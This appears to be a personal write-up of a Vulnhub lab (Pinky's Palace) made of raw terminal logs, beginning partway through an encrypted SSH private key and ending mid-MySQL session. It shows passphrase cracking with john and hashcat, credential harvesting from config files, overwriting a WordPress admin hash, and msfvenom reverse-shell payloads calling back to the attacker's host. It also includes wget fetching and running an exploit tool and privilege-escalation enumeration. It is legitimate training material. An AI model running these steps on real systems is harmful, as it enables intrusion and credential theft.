lyydl9wiTvUrlM7SXBKgMEP5tCK70Rce65i9sr7rxHmWm91uzd2GYBgSqGRIiPLP
hJdRi8HyRIz+1tf2FPoBvkjWl+WyRPpoVovXfEjL6lVvak6W1eNOuaGBjKT+8eaF
JC62d1ozuEM2eqpPcsVp8puwzP8Q77zYpZK9IOUo3xiupv4RrnBEGPYjaC1lLFRo
zlvUtoTnRQ0QCrjYuaL7EYQ1iBWoNc5ZMn1gqhBqQ/oE7/ff4eGhtG2i1LdscVf9
syk6ZBWFFA1wqlb2Vgv5Mn5BHx27GILo7o6yZzyxAuc02oJBnrg5Btlu/Tyx8ADV
ZR70DVA3q+/UoinxJCvH3zdKzOgzqHR9rdj5hiO6Np0Qzg//aWagrij5GqBpjCEt
aY2GxxXQQ8flNelYMvdcjHvZrjW8rKwU0nhyalu0+nFnLnHH6tMvAE6oqeIxIOO6
iJD7yUTrGfz0T7lRJQ7KQfeDQH+KGKgibLi60XWKQanRmrCiMLKnidLCjctyqsgh
lm5gPpqzw8CuPQ3EqPWIHYoDPak7Mk6SfpZaC+HQRauMbQqy5crP9YTtU1ZqRgdq
MsW7gnawwpTiE2cAR+AW9Cmy/n+cWoDvn+ceSrT1q81AjL1rKFSmwLWjKiKgJHER
Kv3zSMoBEzOGKAnQ5UOwOZPX+qQVGba+CJ2sZMdynd9HZrcMD29H4CLGO+VFggqs
3XUvpIcT4Arx9fVIk3hs6XeAnCOhj5f9Q2F4JnbqPdkQzBNJHCnrE8Rl4ymQl6lF
y/hvGWmDEtbockdNHGH9vF22kZuNmGKRROfYN5pmJYD9/L3RIvcC+UGDVojeUt/A
GDvjS8QhfNRwDUwTYHSUmIkz4fQt8g2bp3EixA/EH9IXV0HoBEtPzeaclqJJRBpW
WZK54Uj51hoqymDTfhS5HAwS6XaiN+SXyfXbZAqHMOTlegYNsGsYpGMXIB1oK+OL
lSwZimExQ042jVe4gxZ0ku3Qh/utmGUf3Rf7Ksng42tSt6uaVblXxO1JRPrI/ARt
5b7CjPBBZtIXUbtPF0/mw0q0tVZH/9BWjTvvAiMPlBvFwmujGKS+BA1krTz6YErY
ifoKTISVWsz7H1p4Xn1YD0sqfFtm2TSzsDj+x1Bpw4KXwquAoRfL61F6hVQKhyaV
8H6XaJCKuj8W2RhSe32pO7/MNYyCatZz5OtUt0XHYGf2EEOkihq8hecXpzHK0pnL
RcfhpffVDMjVV70Sl54WM9mqLHRzUWZZhAUehZkKrsou0LHoTrkWkYShrT1sc7uI
LoiicfuXpWegqXYKLSTY6YVn5iKov/eE3W3mxD/MIO4Fmi4VAcCp2EwXUlwQY8jI
839VYkApkA31uNNfp4GQw7ANqsopjN6bKIPpp8FVdCbgg7DlGZUuf/4cnXOc6gDA
K4+6vpcwC4AnJVsBfgjOmWajYple0zmDkQNkj+UptG8uC7VDwcd4FBfP+ISO1LID
MtLdf1/3qMbDQsqbdHXtZs2P84CvbJ2CPfHvTrG30JfXWuZoinMXtGwxY7x/IR0V
EHc/fHCThXM7op4q0MccCJPrhPIhwrM+dHasJGsmLlyy/Oe62c2Hx2Rh09xcU0JF
-----END RSA PRIVATE KEY-----
root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# /usr/sbin/ssh2john id_rsa > id_rsa.hash
root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# cat id_rsa.hash
id_rsa:$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c42414332433732333532453735433837394532463236434336314135423645370a0a6c7979646c397769547655726c4d375358424b674d45503574434b3730526365363569397372377278486d576d3931757a643247594267537147524969504c500a684a64526938487952497a2b3174663246506f42766b6a576c2b57795250706f566f765866456a4c366c5676616b365731654e4f756147426a4b542b386561460a4a43363264316f7a75454d326571705063735670387075777a50385137377a59705a4b39494f556f3378697570763452726e42454750596a6143316c4c46526f0a7a6c7655746f546e5251305143726a5975614c37455951316942576f4e63355a4d6e316771684271512f6f45372f66663465476874473269314c6473635666390a73796b365a42574646413177716c6232566776354d6e35424878323747494c6f376f36795a7a797841756330326f4a426e72673542746c752f547978384144560a5a52373044564133712b2f556f696e784a437648337a644b7a4f677a7148523972646a3568694f364e7030517a672f2f6157616772696a35477142706a4345740a61593247787858515138666c4e656c594d7664636a48765a726a5738724b7755306e6879616c75302b6e466e4c6e484836744d764145366f71654978494f4f360a694a44377955547247667a3054376c524a51374b5166654451482b4b474b6769624c69363058574b51616e526d7243694d4c4b6e69644c436a637479717367680a6c6d35675070717a77384375505133457150574948596f4450616b374d6b365366705a61432b48515261754d62517179356372503959547455315a71526764710a4d735737676e61777770546945326341522b415739436d792f6e2b63576f44766e2b636553725431713831416a4c31724b46536d774c576a4b694b674a4845520a4b76337a534d6f42457a4f474b416e5135554f774f5a50582b7151564762612b434a32735a4d64796e6439485a72634d4432394834434c474f2b5646676771730a335855767049635434417278396656496b336873365865416e434f686a356639513246344a6e627150646b517a424e4a48436e724538526c34796d516c366c460a792f687647576d444574626f636b644e48474839764632326b5a754e6d474b52524f66594e35706d4a5944392f4c3352497663432b554744566f6a6555742f410a4744766a53385168664e527744557754594853556d496b7a34665174386732627033456978412f45483949585630486f424574507a6561636c714a4a524270570a575a4b3534556a3531686f71796d44546668533548417753365861694e2b5358796658625a4171484d4f546c6567594e7347735970474d584942316f4b2b4f4c0a6c53775a696d4578513034326a56653467785a306b753351682f75746d475566335266374b736e67343274537436756156626c58784f314a525072492f4152740a356237436a5042425a7449585562745046302f6d7730713074565a482f3942576a54767641694d506c427646776d756a474b532b4241316b72547a36594572590a69666f4b5449535657737a3748317034586e3159443073716646746d3254537a73446a2b7831427077344b58777175416f52664c363146366856514b687961560a38483658614a434b756a385732526853653332704f372f4d4e59794361745a7a354f7455743058485947663245454f6b6968713868656358707a484b30706e4c0a5263666870666656444d6a56563730536c3534574d396d714c48527a55575a5a68415565685a6b4b72736f75304c486f54726b576b59536872543173633775490a4c6f696963667558705765677158594b4c5354593659566e35694b6f762f65453357336d78442f4d494f34466d6934564163437032457758556c775159386a490a38333956596b41706b413331754e4e66703447517737414e71736f706a4e36624b49507070384656644362676737446c475a5575662f34636e584f63366744410a4b342b36767063774334416e4a56734266676a4f6d57616a59706c65307a6d446b514e6b6a2b5570744738754337564477636434464266502b49534f314c49440a4d744c6466312f33714d624451737162644858745a73325038344376624a32435066487654724733304a665857755a6f696e4d58744777785937782f495230560a4548632f6648435468584d376f703471304d6363434a50726850496877724d2b644861734a47736d4c6c79792f4f653632633248783252683039786355304a460a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a*1766*0
root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
secretz101       (id_rsa)
1g 0:00:00:01 DONE (2018-06-10 08:04) 0.7936g/s 1036Kp/s 1036Kc/s 1036KC/s secretz101
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# 

Strip the passphrase from the key --

08:08:21-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ chmod 600 id_rsa
08:08:51-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ ssh-keygen -f id_rsa -p
Enter old passphrase: 
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
13:52:22-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$


Testing Auth with new Key --

root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# ssh -p 4655 -i id_rsa stefano@pinkydb
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~$ id
uid=1002(stefano) gid=1002(stefano) groups=1002(stefano)
stefano@Pinkys-Palace:~$ cat /var/www/html/apache/wp-config.php | grep DB
define('DB_NAME', 'pwp_db');
define('DB_USER', 'pinkywp');
define('DB_PASSWORD', 'pinkydbpass_wp');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');
stefano@Pinkys-Palace:/tmp$ ps -ef | grep mysql
mysql       618      1  0 Jun09 ?        00:04:27 /usr/sbin/mysqld
stefano    7339   5860  0 10:00 pts/0    00:00:00 grep mysql
stefano@Pinkys-Palace:/tmp$ mysql -u pinkywp -h localhost -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 211587
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| pwp_db             |
+--------------------+
2 rows in set (0.01 sec)

MariaDB [(none)]> use pwp_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pwp_db]> show tables;
+-----------------------+
| Tables_in_pwp_db      |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

MariaDB [pwp_db]> select * FROM wp_users;
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | pinky1337  | $P$BqBoittC5WZl0XUL8GVKO1t9R6HcJU/ | pinky1337     | pinky@localhost.com |          | 2018-03-17 22:58:07 |                     |           0 | pinky1337    |
+----+------------+------------------------------------+---------------+---------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

MariaDB [pwp_db]> \q
Bye
stefano@Pinkys-Palace:/tmp$

Crack the Hash --
Note: Added 'cewl -d 5 -m 7 192.168.1.119' output to the top of rockyou.txt for good measure.

root@7242-alpha-reticuli:/home/cdowns/Documents/Vulnhub# echo '$P$BqBoittC5WZl0XUL8GVKO1t9R6HcJU/' >> pinkyl337.hash
root@7242-alpha-reticuli:/tmp# hashcat -a 0 -m 400 pinkyl337.hash /home/cdowns/Github/SecLists/Passwords/bt4-password.txt --force -O -r /usr/share/hashcat/rules/best64.rule 
hashcat (v4.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 8192/30002 MB allocatable, 8MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=400 -D _unroll'
Dictionary cache hit:
* Filename..: /home/cdowns/Github/SecLists/Passwords/bt4-password.txt
* Passwords.: 1652903
* Bytes.....: 15663314
* Keyspace..: 127273531

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)
Hash.Target......: $P$BqBoittC5WZl0XUL8GVKO1t9R6HcJU/
Time.Started.....: Sun Jun 10 16:32:44 2018 (2 mins, 38 secs)
Time.Estimated...: Sun Jun 10 21:50:18 2018 (5 hours, 14 mins)
Guess.Base.......: File (/home/cdowns/Github/SecLists/Passwords/bt4-password.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:     6680 H/s (10.03ms) @ Accel:512 Loops:128 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 1052672/127273531 (0.83%)
Rejected.........: 0/1052672 (0.00%)
Restore.Point....: 12288/1652903 (0.74%)
Candidates.#1....: 123buk3fu11999 -> 124n7ip01399
HWMon.Dev.#1.....: N/A

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 

---- snip -----

Fuck waiting for hashcat --
Lets update the damn password. Make sure we are an administrator --

stefano@Pinkys-Palace:~$ cat /var/www/html/apache/wp-config.php | grep DB
define('DB_NAME', 'pwp_db');
define('DB_USER', 'pinkywp');
define('DB_PASSWORD', 'pinkydbpass_wp');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');
stefano@Pinkys-Palace:~$ mysql -u pinkywp -h localhost -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 5
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use pwp_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pwp_db]> show tables LIKE '%users';
+---------------------------+
| Tables_in_pwp_db (%users) |
+---------------------------+
| wp_users                  |
+---------------------------+
1 row in set (0.00 sec)

MariaDB [pwp_db]> SELECT ID, user_login, user_pass FROM wp_users WHERE user_login = 'pinky1337';
+----+------------+------------------------------------+
| ID | user_login | user_pass                          |
+----+------------+------------------------------------+
|  1 | pinky1337  | $P$BqBoittC5WZl0XUL8GVKO1t9R6HcJU/ |
+----+------------+------------------------------------+
1 row in set (0.00 sec)

MariaDB [pwp_db]> UPDATE wp_users SET user_pass=MD5('pwn3d') WHERE user_login = 'pinky1337';
Query OK, 1 row affected (0.01 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [pwp_db]> SELECT ID, user_login, user_pass FROM wp_users WHERE user_login = 'pinky1337';
+----+------------+----------------------------------+
| ID | user_login | user_pass                        |
+----+------------+----------------------------------+
|  1 | pinky1337  | b2f3d1e0efcb5d60e259a34ecbbdbe00 |
+----+------------+----------------------------------+
1 row in set (0.00 sec)

MariaDB [pwp_db]> 

LOGGED IN !!! --
LETS UPLOAD A SHELL AND GET THAT DAMN FILE --

17:36:35-cdowns@7242-alpha-reticuli:~/Github/wordpress-reverse-bind-shell$ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.116 LPORT=31338 -f raw > reverse.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 30305 bytes

17:36:44-cdowns@7242-alpha-reticuli:~/Github/wordpress-reverse-bind-shell$ cp * r_shell_plugin/
cp: -r not specified; omitting directory 'r_shell_plugin'
17:36:55-cdowns@7242-alpha-reticuli:~/Github/wordpress-reverse-bind-shell$ zip -r r_shell_plugin.zip r_shell_plugin/
  adding: r_shell_plugin/ (stored 0%)
  adding: r_shell_plugin/cmd.php (stored 0%)
  adding: r_shell_plugin/reverse.php (deflated 76%)
  adding: r_shell_plugin/shell.php (deflated 76%)
  adding: r_shell_plugin/README.md (deflated 43%)
  adding: r_shell_plugin/hello.php (deflated 36%)
  adding: r_shell_plugin/bind.php (deflated 64%)
  adding: r_shell_plugin/readme.txt (deflated 26%)
17:37:07-cdowns@7242-alpha-reticuli:~/Github/wordpress-reverse-bind-shell$  

Time to Upload ! --
!!!!!! FUCKER !!!!!! --
"Unable to create directory wp-content/uploads/2018/06. Is its parent directory writable by the server?"

Ok... Lets SCP it over and exec a shell back --
Well have metasploit do a vuln recon for us --

18:11:20-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.116 LPORT=31338 -f elf > r_shellx64.elf
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

18:27:34-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$scp -P 4655 -i id_rsa r_shellx64.elf stefano@192.168.1.119:/tmp/
r_shell.elf                                                                                                                                                  100%  207   397.9KB/s   00:00    
18:28:35-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$

stefano@Pinkys-Palace:/tmp$ chmod 755 r_shellx64.elf 
stefano@Pinkys-Palace:/tmp$ ./r_shellx64.elf

root@7242-alpha-reticuli:/tmp# msfconsole -q -x "use exploit/multi/handler; set LHOST 192.168.1.116; set LPORT 31338; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set ExitOnSession false ; exploit -j -z"
LHOST => 192.168.1.116
LPORT => 31338
PAYLOAD => linux/x64/meterpreter/reverse_tcp
ExitOnSession => false
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.1.116:31338 
msf exploit(multi/handler) > [*] Sending stage (812100 bytes) to 192.168.1.119
[*] Meterpreter session 1 opened (192.168.1.116:31338 -> 192.168.1.119:57232) at 2018-06-10 18:35:53 -0500

msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > run

[*] 192.168.1.119 - Collecting local exploits for x64/linux...
[*] 192.168.1.119 - 17 exploit checks are being tried...
[*] Post module execution completed
msf post(multi/recon/local_exploit_suggester) > 

BOOOOO !!!!! --

Meanwhile --
Run linuxprivchecker.py
 
stefano@Pinkys-Palace:/tmp$ python linuxprivchecker.py >> lpc.txt
stefano@Pinkys-Palace:/tmp$ less lpc.txt

Interesting Finds --

[+] SUID/SGID Files and Directories
    -rwxr-sr-x 1 root shadow 35592 May 27  2017 /sbin/unix_chkpwd
    drwxrwsr-x 2 root staff 4096 Nov 19  2017 /var/local
    drwxrwsr-x 2 root mail 4096 Mar 17 04:24 /var/mail
    drwxr-s--- 2 mysql adm 4096 Jun 10 06:25 /var/log/mysql
    -rwsr----x 1 pinky www-data 13384 Mar 16 04:40 /home/stefano/tools/qsub
    drwxrwsr-x 10 root staff 4096 Mar 17 04:24 /usr/local
    drwxrwsr-x 2 root staff 4096 Mar 17 04:24 /usr/local/src

Root is allowed to login via SSH
	PermitRootLogin yes 

What does it do ? string failed..... Obvioulsy. No perms --
Do we have to crack this thing too ? Lets try the password we initially had ( secretz101 ) --

stefano@Pinkys-Palace:~$ /home/stefano/tools/qsub
/home/stefano/tools/qsub <Message>
stefano@Pinkys-Palace:~$ /home/stefano/tools/qsub 'this is a test'
[+] Input Password: secretz101
[!] Incorrect Password!
stefano@Pinkys-Palace:~$ 

Hrmmmmm ---

Lets check kernelpop --

stefano@Pinkys-Palace:/tmp$ wget -q -c http://192.168.1.116:81/kernelpop
stefano@Pinkys-Palace:/tmp$ chmod 755 kernelpop 
stefano@Pinkys-Palace:/tmp$ ./kernelpop 

##########################
#  welcome to kernelpop  #
#                        #
# let's pop some kernels #
##########################

[*] grabbing distro version and release from underlying OS (linuxdebian9)
[*] grabbing kernel version from 'uname -a'
[+] kernel (Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux) identified as:
[base]
	type:			linux
	distro:			linuxdebian9
	version:		4.9.0-4
	architecture:		amd64
[specific]
	type:			linux
	distro:			linuxdebian9
	version:		4.9.65-3
	architecture:		amd64
[*] matching kernel to known exploits
[-] no exploits found for this kernel
stefano@Pinkys-Palace:/tmp$ 

Is that so ? --
Back to linuxprivchecker.py --
Ok LinEnum.sh -t --

-rw-r--r-- 1 stefano stefano 180 Jun 10 09:41 /home/stefano/.wget-hsts
-rw-r--r-- 1 stefano stefano 3526 May 15  2017 /home/stefano/.bashrc
-rw-r--r-- 1 stefano stefano 675 May 15  2017 /home/stefano/.profile
-rw-r--r-- 1 stefano stefano 220 May 15  2017 /home/stefano/.bash_logout
-rw-r--r-- 1 stefano stefano 65 Mar 16 04:28 /home/stefano/tools/note.txt

stefano@Pinkys-Palace:/tmp$ ls -l /home/stefano/tools/
total 20
-rw-r--r-- 1 stefano stefano     65 Mar 16 04:28 note.txt
-rwsr----x 1 pinky   www-data 13384 Mar 16 04:40 qsub
stefano@Pinkys-Palace:/tmp$ cat /home/stefano/tools/note.txt
Pinky made me this program so I can easily send messages to him.
stefano@Pinkys-Palace:/tmp$ 

drwxr-xr-x 4 stefano stefano 4.0K Jun 10 10:17 .
drwxr-xr-x 5 root    root    4.0K Mar 17 15:20 ..
-rw------- 1 stefano stefano  287 Jun 10 06:12 .bash_history
-rw-r--r-- 1 stefano stefano  220 May 15  2017 .bash_logout
-rw-r--r-- 1 stefano stefano 3.5K May 15  2017 .bashrc
-rw------- 1 stefano stefano   49 Jun 10 10:17 .lesshst
-rw------- 1 stefano stefano   68 Jun 10 10:02 .mysql_history
-rw-r--r-- 1 stefano stefano  675 May 15  2017 .profile
drwx------ 2 stefano stefano 4.0K Mar 17 04:01 .ssh
drwxr-xr-x 2 stefano stefano 4.0K Mar 17 04:01 tools
-rw------- 1 stefano stefano  638 Jun 10 09:52 .viminfo
-rw-r--r-- 1 stefano stefano  180 Jun 10 09:41 .wget-hsts


-r--r--r-- 1 root root 1766 Mar 14 17:25 /var/www/html/nginx/pinkydb/html/credentialsdir1425364865/id_rsa
-rw------- 1 stefano stefano 403 Mar 14 17:25 /home/stefano/.ssh/authorized_keys

stefano@Pinkys-Palace:/tmp$ cat /var/www/html/nginx/pinkydb/html/credentialsdir1425364865/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,BAC2C72352E75C879E2F26CC61A5B6E7

lyydl9wiTvUrlM7SXBKgMEP5tCK70Rce65i9sr7rxHmWm91uzd2GYBgSqGRIiPLP
hJdRi8HyRIz+1tf2FPoBvkjWl+WyRPpoVovXfEjL6lVvak6W1eNOuaGBjKT+8eaF
JC62d1ozuEM2eqpPcsVp8puwzP8Q77zYpZK9IOUo3xiupv4RrnBEGPYjaC1lLFRo
zlvUtoTnRQ0QCrjYuaL7EYQ1iBWoNc5ZMn1gqhBqQ/oE7/ff4eGhtG2i1LdscVf9
syk6ZBWFFA1wqlb2Vgv5Mn5BHx27GILo7o6yZzyxAuc02oJBnrg5Btlu/Tyx8ADV
ZR70DVA3q+/UoinxJCvH3zdKzOgzqHR9rdj5hiO6Np0Qzg//aWagrij5GqBpjCEt
aY2GxxXQQ8flNelYMvdcjHvZrjW8rKwU0nhyalu0+nFnLnHH6tMvAE6oqeIxIOO6
iJD7yUTrGfz0T7lRJQ7KQfeDQH+KGKgibLi60XWKQanRmrCiMLKnidLCjctyqsgh
lm5gPpqzw8CuPQ3EqPWIHYoDPak7Mk6SfpZaC+HQRauMbQqy5crP9YTtU1ZqRgdq
MsW7gnawwpTiE2cAR+AW9Cmy/n+cWoDvn+ceSrT1q81AjL1rKFSmwLWjKiKgJHER
Kv3zSMoBEzOGKAnQ5UOwOZPX+qQVGba+CJ2sZMdynd9HZrcMD29H4CLGO+VFggqs
3XUvpIcT4Arx9fVIk3hs6XeAnCOhj5f9Q2F4JnbqPdkQzBNJHCnrE8Rl4ymQl6lF
y/hvGWmDEtbockdNHGH9vF22kZuNmGKRROfYN5pmJYD9/L3RIvcC+UGDVojeUt/A
GDvjS8QhfNRwDUwTYHSUmIkz4fQt8g2bp3EixA/EH9IXV0HoBEtPzeaclqJJRBpW
WZK54Uj51hoqymDTfhS5HAwS6XaiN+SXyfXbZAqHMOTlegYNsGsYpGMXIB1oK+OL
lSwZimExQ042jVe4gxZ0ku3Qh/utmGUf3Rf7Ksng42tSt6uaVblXxO1JRPrI/ARt
5b7CjPBBZtIXUbtPF0/mw0q0tVZH/9BWjTvvAiMPlBvFwmujGKS+BA1krTz6YErY
ifoKTISVWsz7H1p4Xn1YD0sqfFtm2TSzsDj+x1Bpw4KXwquAoRfL61F6hVQKhyaV
8H6XaJCKuj8W2RhSe32pO7/MNYyCatZz5OtUt0XHYGf2EEOkihq8hecXpzHK0pnL
RcfhpffVDMjVV70Sl54WM9mqLHRzUWZZhAUehZkKrsou0LHoTrkWkYShrT1sc7uI
LoiicfuXpWegqXYKLSTY6YVn5iKov/eE3W3mxD/MIO4Fmi4VAcCp2EwXUlwQY8jI
839VYkApkA31uNNfp4GQw7ANqsopjN6bKIPpp8FVdCbgg7DlGZUuf/4cnXOc6gDA
K4+6vpcwC4AnJVsBfgjOmWajYple0zmDkQNkj+UptG8uC7VDwcd4FBfP+ISO1LID
MtLdf1/3qMbDQsqbdHXtZs2P84CvbJ2CPfHvTrG30JfXWuZoinMXtGwxY7x/IR0V
EHc/fHCThXM7op4q0MccCJPrhPIhwrM+dHasJGsmLlyy/Oe62c2Hx2Rh09xcU0JF
-----END RSA PRIVATE KEY-----
stefano@Pinkys-Palace:/tmp$ cat /home/stefano/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDINMm4j+slL1dgaBmew7qbg69628rbhC/siT3Z3lEmNRx4o1q2WzAJq53VeRynMPO/niXsyf31b3uDGB5zOkBobdYAh47LYFYqCWWG/Ql7I0ubtJFwm1e3iLGYe1ScvUZg3u8r5TSwjBzYFabP5PhWMjqFQzLZeV8rgzmLkm5ythud1UNRz5BM+xKoiX245uBxkaVzWD5aAoC2omE/X/4RlvRB/qDSNV1hg2NjpFzAUEDNOoHkwCr6SHFpPKiS71axiM1SDXnaS8eC5ylMTlDV2/XCbYZ7/eT1tqfMU4kt9bMTOthWnYk+lrOn4UfIU6oIPdOCXWHNm7STWzKw0fqZ stefano@Pinkys-Palace
stefano@Pinkys-Palace:/tmp$

/var/www/html/apache/wordpress/wp-includes/certificates:
total 292K
drwxr-xr-x  2 nobody nogroup 4.0K Feb  6 07:49 .
drwxr-xr-x 18 nobody nogroup  12K Feb  6 07:49 ..
-rw-r--r--  1 nobody nogroup 274K May 13  2016 ca-bundle.crt

/var/www/html/apache/wordpress/wp-includes/images/media:
total 44K
drwxr-xr-x 2 nobody nogroup 4.0K Feb  6 07:49 .
drwxr-xr-x 6 nobody nogroup 4.0K Feb  6 07:49 ..
-rw-r--r-- 1 nobody nogroup  417 Mar 27  2014 archive.png
-rw-r--r-- 1 nobody nogroup  382 Mar 27  2014 audio.png
-rw-r--r-- 1 nobody nogroup  274 Mar 25  2014 code.png
-rw-r--r-- 1 nobody nogroup  168 Mar 25  2014 default.png
-rw-r--r-- 1 nobody nogroup  200 Mar 25  2014 document.png
-rw-r--r-- 1 nobody nogroup  319 Mar 25  2014 interactive.png
-rw-r--r-- 1 nobody nogroup  188 Mar 25  2014 spreadsheet.png
-rw-r--r-- 1 nobody nogroup  188 Mar 25  2014 text.png
-rw-r--r-- 1 nobody nogroup  283 Mar 25  2014 video.png

/var/www/html/apache/wordpress/wp-includes/Text/Diff/Engine:
total 48K
drwxr-xr-x 2 nobody nogroup 4.0K Feb  6 07:49 .
drwxr-xr-x 4 nobody nogroup 4.0K Feb  6 07:49 ..
-rw-r--r-- 1 nobody nogroup  16K Oct 26  2017 native.php
-rw-r--r-- 1 nobody nogroup 5.1K Oct  2  2017 shell.php
-rw-r--r-- 1 nobody nogroup 8.2K Oct 24  2015 string.php
-rw-r--r-- 1 nobody nogroup 2.2K May 25  2013 xdiff.php

/var/www/html/nginx/pinkydb/html:
total 32K
drwxr-xr-x 3 www-data www-data 4.0K Mar 17 03:56 .
drwxr-xr-x 3 www-data www-data 4.0K Mar 17 03:56 ..
-rw-r--r-- 1 www-data www-data  215 Mar 16 01:11 config.php
drwxr-xr-x 2 www-data www-data 4.0K Mar 17 03:56 credentialsdir1425364865
-rw-r--r-- 1 www-data www-data  206 Mar 16 03:54 filesselif1001.php
-rw-r--r-- 1 www-data www-data  134 Mar 16 00:20 index.php
-rw-r--r-- 1 www-data www-data 1.1K Mar 17 00:55 login.php
-rw-r--r-- 1 www-data www-data   34 Mar 16 03:16 pageegap.php


stefano@Pinkys-Palace:/tmp$ cat /var/www/html/nginx/pinkydb/html/config.php 
<?php
	define('DB_HOST', 'localhost');
	define('DB_USER', 'secretpinkdbuser');
	define('DB_PASS', 'pinkyssecretdbpass');
	define('DB_NAME', 'secretsdb');
	$conn = mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_NAME);
?>
stefano@Pinkys-Palace:/tmp$ mysql -u secretpinkdbuser -h localhost -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 211597
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| secretsdb          |
+--------------------+
